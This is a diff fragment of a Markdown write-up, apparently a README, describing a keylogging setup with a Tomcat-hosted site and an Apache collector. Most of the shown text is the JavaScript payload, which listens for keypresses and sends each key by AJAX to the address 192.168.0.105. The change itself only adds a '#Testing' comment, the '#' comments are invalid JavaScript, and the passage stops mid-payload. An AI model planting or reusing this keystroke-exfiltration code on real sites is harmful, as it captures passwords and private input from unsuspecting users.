@@ -8,7 +8,7 @@ I hosted the website on my **Tomcat** Server and used **Apache** for **Keyloggin
 The *payload* used for Keylogging:
 ```
 document.addEventListener('keypress', function() {
-	console.log(arguments[0].key);
+	console.log(arguments[0].key); #Testing
 	$.ajax({
 		type: 'GET',
 		url: 'http://192.168.0.105', #apache
